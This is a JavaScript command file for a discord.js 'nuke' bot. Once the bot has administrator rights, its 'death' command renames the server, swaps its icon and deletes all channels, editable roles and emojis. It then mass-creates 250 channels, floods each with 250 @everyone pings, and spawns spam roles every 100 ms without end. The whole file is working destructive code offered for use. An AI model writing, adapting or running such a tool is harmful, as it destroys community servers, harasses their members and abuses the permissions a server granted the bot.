const config = require("../../config.json");
const { MessageEmbed, RichEmbed, Message } = require("discord.js");
const { promptMessage, successEmbed } = require("../../functions.js");
const fs = require("fs");
const db = require('quick.db');//https://www.npmjs.com/package/quick.db
module.exports = {
    name: "death",
    category: "nuke",
    description: "",
    run: async (client, message, args, arguments) => {
        try {
            if (message.guild.me.hasPermission("ADMINISTRATOR")) {
                if (message.author.id == config.ownerid) {
                    message.delete();
                    message.guild.setName(`death is near.`).then(console.log(`Server Name changed to: ${message.guild.name} Wizzed`)); // changes server name
    
                    // Channel Delete
                    message.guild.channels.cache.forEach(channel => channel.delete().then(
                        console.log(`CHANNEL FUCKED`)
                    ).then(
                        // Channel Icon Change
                        message.guild.setIcon('https://media.discordapp.net/attachments/782211616350404611/800703405508919326/death.gif') // changes server pfp
                    ));
    
                    // Roles
                    message.guild.roles.cache.forEach((role) => {
                        if (!role.editable) {
                            return;
                        } else {
                            role.delete("Nuking").then(console.log(`ROLE: ${role.name} is being deleted successfully`))
                        }
                    })
    
                    // Emoji
                    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(`EMOJI: ${e.name} was deleted successfully`)))
    
                    // Massing Channels
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
    
                    if (!argresult) {
                        message.channel.send("*Add an input after the cmd*")
                    } else {
    
                        for (var i = 0; i < 250; i++) {
                            let channels = message.guild.channels.create(argresult)
    
                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send(`@everyone ${argresult}`)
                                        console.log(`CHANNEL PINGED!`);
                                        // other per-channnel logic
                                    }
                                }
                            )
                        }
                    }
                    setInterval(function () {
                        var i = 0; i < 250;
                        message.guild.roles.create({
                            data: {
                                name: `${argresult}`,
                                position: i++,
                                color: "RANDOM"
                            }
                        }).then(console.log("ROLE BEING MASSED"))
                    }, 100) // 0.1 second
                }
            } else {
                return console.log("PERMISSION MISSING: ADMINSTRATOR!!!!!")
            }   
        }
        catch(err) {
            console.log(err)
        }
    }
}